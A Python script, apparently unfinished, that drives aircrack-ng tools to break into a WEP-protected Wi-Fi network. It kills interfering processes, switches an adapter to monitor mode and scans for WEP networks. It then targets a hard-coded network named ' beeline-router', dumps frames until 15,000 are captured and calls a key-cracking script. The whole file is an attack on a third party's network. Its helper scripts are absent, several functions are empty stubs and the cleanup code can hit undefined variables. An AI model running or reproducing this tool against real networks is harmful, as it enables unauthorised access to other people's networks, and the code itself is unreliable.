import numpy as np
import pandas as pd
import subprocess
import multiprocessing
import asyncio
import time
from io import StringIO

# State
currentMonitorAdapter = "_no_adapter_"
isPollingNetworks = False
isDumpingNetword = False

# Const
framesNeeded = 15000

def checkMonitorAdapter():
    return currentMonitorAdapter != "_no_adapter_"

def main():
    try:
        adapters = GetAdapters()
        SwitchMonitorMode(adapters[0])
        process = StartWepNetworksSearching()
        time.sleep(10)
        StopWepNetworksSearching(process)

        networks = GetWepNetworks()
        i = networks["SSID"].index(" beeline-router")
        bssid = networks["BSSID"][i]
        Channel = networks["Channel"][i]
        SSID = networks["SSID"][i]

        dumpingProcess = StartNetworkDumping(dict(zip(["BSSID", "Channel", "SSID"], [bssid, Channel, SSID])))

        framesReady = 0
        while (framesReady < framesNeeded):
            time.sleep(6)
            framesReady = GetFramesQuantity()

        print("END OF REC")
        StopNetworkDumping(dumpingProcess)
    finally:
        StopWepNetworksSearching(process)
        StopNetworkDumping(dumpingProcess)
        subprocess.run(["bash", "clean.sh", currentMonitorAdapter])
        return

# return exit code of child process
def Prepare() -> int:
    ok = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    return ok

def GetAdapters():
    subprocess.run(["bash", "GetAdapters.sh"])
    adaptersDf = pd.read_csv('adapters.txt', sep='\t')
    adapters = list(adaptersDf['Interface'])
    subprocess.run(['sudo', 'rm', 'adapters.txt'])

    return adapters

def SwitchMonitorMode(adapter : str):
    ok = subprocess.run(["bash", "StartAdapter.sh", adapter])
    if ok:
        global currentMonitorAdapter
        currentMonitorAdapter = adapter + "mon"
    return ok

def StartWepNetworksSearching():
    if checkMonitorAdapter():
        process = subprocess.Popen(["sudo", "bash", "WepNetworkSearching.sh", currentMonitorAdapter])
        global isPollingNetworks
        isPollingNetworks = True
        return process
    return 0

def StopWepNetworksSearching(process : subprocess.Popen):
    global isPollingNetworks
    isPollingNetworks = False

    process.terminate()
    return

def GetWepNetworks():
    if (checkMonitorAdapter()):
        networksDf = pd.read_csv('networks.temp-01.csv', sep=',')
        bssidList = list(networksDf["BSSID"])
        channelList = list(networksDf[" channel"])
        ssidList = list(networksDf[" ESSID"])

        listLen = bssidList.index('Station MAC')
        bssidList = bssidList[:listLen]
        channelList = channelList[:listLen]
        ssidList = ssidList[:listLen]

        outList = dict(zip(["BSSID", "Channel", "SSID"], [bssidList, channelList, ssidList]))
        return outList

    return []

def StartNetworkDumping(network):
    process = subprocess.Popen(["bash", "StartDumping.sh", network["BSSID"], network["Channel"], currentMonitorAdapter])
    return process

def StopNetworkDumping(process : subprocess.Popen):
    process.terminate()


def GetFramesQuantity() -> int:
    # framesStateDf = pd.read_csv('basic_wep.cap-01.csv', sep=',')
    # probedList = (int(k) for k in framesStateDf[" Probed ESSIDs"])
    with open('basic_wep.cap-01.csv', 'r') as file:
        lines = file.readlines()

    # Предположим, что таблицы разделены пустой строкой
    table1_lines = []
    table2_lines = []
    table_switch = True  # Переключатель для определения, в какую таблицу добавлять строки
    lines = lines[1:]
    for line in lines:
        if line == "\n" and table_switch == True:  # Пустая строка
            table_switch = False # Переключаем таблицу
        elif table_switch:
            table1_lines.append(line)
        else:
            table2_lines.append(line)

    # Создание DataFrame для первой таблицы
    table1 = pd.read_csv(StringIO(''.join(table1_lines)))

    # Создание DataFrame для второй таблицы
    table2 = pd.read_csv(StringIO(''.join(table2_lines)))
    tempList = [int(k) for k in table2[" # packets"]]

    return max(tempList)



def GetNetworkKey():
    process = subprocess.Popen(["bash", "CrackKey.sh"])

    time.sleep(5)
    process.terminate()

    # if key exists return GetAsciiKey else return False

    return True

def GetAsciiKey():
    # parse key.log file if GetNetworkKey Succeeded
    return

def RemoveTempFiles():
    return

def BackendShutdown():
    return

# if __name__ == '__main__':
#     main()

GetNetworkKey()